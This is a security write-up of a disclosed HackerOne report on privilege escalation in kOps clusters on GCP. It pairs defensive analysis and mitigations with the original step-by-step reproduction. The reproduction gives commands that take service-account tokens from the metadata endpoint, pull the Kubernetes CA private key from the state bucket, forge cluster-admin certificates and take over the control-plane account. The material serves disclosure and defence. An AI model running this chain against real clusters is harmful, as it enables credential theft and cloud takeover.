# Privilege Escalation in kOps GCP Provider via Service Account Credential Exposure

## Metadata
- **Source:** HackerOne
- **Report:** 1842829 | https://hackerone.com/reports/1842829
- **Submitted:** 2023-01-22
- **Reporter:** jpts
- **Program:** Kubernetes kOps
- **Bounty:** Not specified in report
- **Severity:** CRITICAL
- **Vuln:** Privilege Escalation, Credential Exposure, Insecure Service Account Configuration, Insufficient Access Controls, Certificate Authority Key Exposure
- **CVEs:** None
- **Category:** auth-crypto

## Summary
kOps exposes GCP service account credentials via metadata endpoint to all pod users, allowing privilege escalation to cluster admin and further compromise of GCP infrastructure. A user with shell access to any pod can obtain service account tokens, access the state bucket containing Kubernetes CA keys, forge cluster-admin certificates, and escalate to full cluster control and GCP resource compromise.

## Attack scenario
1. Attacker gains shell access to a regular pod running on any worker node in a kOps/GCP cluster
2. Attacker queries GCP metadata endpoint to retrieve service account token and state bucket location from instance metadata
3. Attacker uses the compromised service account credentials to access the kOps state bucket and download the Kubernetes CA private key
4. Attacker generates a fraudulent system:masters certificate signed with the CA key using cfssl tool
5. Attacker constructs a malicious kubeconfig with the forged certificate and gains cluster-admin access to the Kubernetes API
6. Attacker deploys pods on master nodes, obtains the privileged master service account token, and uses it to compromise GCP project infrastructure

## Root cause
kOps assigns GCP service accounts with overly permissive IAM roles to all cluster nodes, including worker nodes. The service account credentials are accessible via the metadata endpoint to all pods running on those nodes. The Kubernetes CA private key is stored in the state bucket without adequate access controls, allowing any authenticated GCP service account holder to retrieve and misuse it for certificate forgery.

## Attacker mindset
An insider or compromised application with pod shell access seeks to maximize impact by escalating to cluster administration and then pivoting to cloud infrastructure compromise. The attacker recognizes that service account tokens are readily available via metadata endpoints and that CA keys stored in state buckets can be weaponized to forge valid authentication credentials.

## Defensive takeaways
- Implement Workload Identity Federation to provide pod-level identity instead of node-level service account tokens exposed via metadata
- Use Kubernetes Network Policies to restrict pod access to the GCP metadata endpoint (169.254.169.254)
- Store Kubernetes CA private keys in encrypted secret management systems (e.g., GCP Secret Manager, HashiCorp Vault) instead of state buckets
- Apply principle of least privilege to service account IAM roles; separate worker node and control-plane node permissions
- Enable GCP VPC Service Controls and access context managers to restrict access to state buckets
- Implement RBAC policies limiting pod capabilities and preventing privileged pod deployment
- Use Pod Security Standards to prevent privileged containers that could access metadata endpoints
- Rotate CA keys regularly and audit access logs to the state bucket
- Implement admission controllers to prevent pods from mounting service account tokens or accessing metadata endpoints
- Monitor and alert on suspicious kubeconfig generation or certificate signing requests

## Variant hunting
Check if other Kubernetes cluster provisioning tools (kube-up, kubespray, EKS) properly isolate service account credentials per node
Examine if GKE's Workload Identity mitigation is consistently applied across different deployment patterns
Investigate whether other cloud providers (AWS, Azure) have similar metadata endpoint exposure issues with their provisioning tools
Test if kOps with other cloud providers (AWS IAM roles, Azure managed identities) have equivalent privilege escalation paths
Verify if kOps state bucket access can be further exploited to modify cluster configuration for persistence
Check for SSRF vulnerabilities in kOps tooling that could access metadata endpoints directly

## MITRE ATT&CK
- T1190
- T1199
- T1526
- T1528
- T1134
- T1555
- T1552
- T1552.007
- T1078
- T1078.004
- T1098
- T1098.002
- T1548
- T1548.010

## Notes
This vulnerability affects standard kOps deployments on GCP without Workload Identity Federation. The attack chain is straightforward and requires minimal sophistication. The impact extends beyond the Kubernetes cluster to the underlying GCP project infrastructure. Mitigation requires architectural changes to how credentials are managed in kOps rather than simple configuration hardening.

## Full report
<details><summary>Expand</summary>

## Summary:
When using kOps with the GCP provider, it is possible for a user with shell access to any pod, to escalate their privileges to cluster admin. During provisioning of the cluster, kOps gives all nodes access to the state storage bucket through the service account associated with the instance. Any user with shell access can request the service account credentials, and read sensitive information from the state store. Using this information, the user can privesc to cluster admin, compromising the entire cluster. It is further possible to compromise a privileged GCP service account associated with the control-plane nodes and takeover other resources in the GCP project.

## Kubernetes Version:
Kubernetes: v1.25.5

## Component Version:
kOps: v1.25.3

## Steps To Reproduce:
### Cluster Setup:

The test cluster was setup as close to the [getting started](https://kops.sigs.k8s.io/getting_started/gce/) guide as possible.
```bash
export KOPS_STATE_STORE=gs://kops-state-test/
export PROJECT=`gcloud config get-value project`

gsutil mb $KOPS_STATE_STORE
kops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2
kops update cluster --name kops.k8s.local --yes --admin
kops validate cluster --wait 10m
```
### Privesc
  1. Add a demo container in which user is allow shell access (manifest attached):
  `k apply -f shell.yaml`
  2. Give ourselves a shell:
  `k exec -it shell-5d64dd647c-8l8s6 -it -- ash`
  3. Grab the service account token and state bucket name
  ```
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase
  ```
  4. Copy file back to the host
  ```
  k cp shell-5d64dd647c-8l8s6:/default.token default.token
  ```
  5.  Ensure normal gcloud auth not in use and set token environment var
  ```
  gcloud auth revoke
  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./default.token)
  ```
  6. Grab the kubernetes CA keys
  ```
  mkdir -p keys
  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].privateMaterial' - | base64 -d > keys/ca.key
  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].publicMaterial' - | base64 -d > keys/ca.pem
  ```
  7. Generate system:masters cert (csr.json template attached)
  ```
  cd keys
  cfssl gencert -ca=ca.pem -ca-key=ca.key -profile=kubernetes csr.json | cfssljson -bare user
  ```
  8. Construct new kubeconfig
  ```
  export KUBECONFIG=./pwn.kconfig
  k config set-credentials pwn --client-certificate=user.pem --client-key=user-key.pem
  k config set-cluster kops --certificate-authority=ca.pem --server=https://<kops-ip>
  k config set-context pwn@kops --cluster=kops --user=pwn
  k config use-context pwn@kops
  ```
  9. Check we are cluster-admin
  `k auth can-i '*' '*' -A`
  10. Deploy a pod on the master node (example manifest included), make sure to edit to the correct node name
  `k apply -f shell-master.yaml`
  11. Give ourselves a shell:
  `k exec -it shell-78d66f6f7c-ft7ch -it -- ash`
  12. Grab the privileged GCP service account token
  ```
  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token
  ```
 13. Copy the token back to our host
  ```
  k cp shell-78d66f6f7c-ft7ch:/admin.token admin.token
  ```
  14. Set our credentials
  ```
  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./admin.token)
  ```
  15. Run a cryptominer ....
  ```
  gcloud compute instances create miner --image-family=ubuntu-2204-lts --zone=europe-west1-b --image-project=ubuntu-os-cloud
  ```

## Supporting Material/References:
  * shell.yaml - basic alpine deployment to simulator a user with shell access
  * shell-master.yaml - similar simple deployment, targeting a master node
  * csr.json - used to configure cfssl to generate the malicious system:masters mTLS certs
  * auth-can-i.png - proof we have cluster admin
  * miner.png - proof we can spin up arbitrary instances
  * [Kubernetes Engine Service Agent Role](https://cloud.google.com/iam/docs/understanding-roles#container.serviceAgent)

## Tools used
 * https://github.com/cloudflare/cfssl
 * https://github.com/mikefarah/yq

## Impact

Once the attacker has compromised the cluster, they have access to all cluster resources. This includes any secrets/data stored by the cluster and also any secrets/data that is accessible by any GCP service accounts in use by the cluster. As the attacker is able to compromise the cluster, they can compromise the master nodes. In GCE kOps, the master node service accounts have the "Kubernetes Engine Service Agent" role, which is highly permissive, and would likely allow the compromise of other resources in the GCP project. Since the role has compute create permissions, it could also be abused for  attacks such as crypto-mining.

</details>

---
*Analysed by Claude on 2026-05-24*
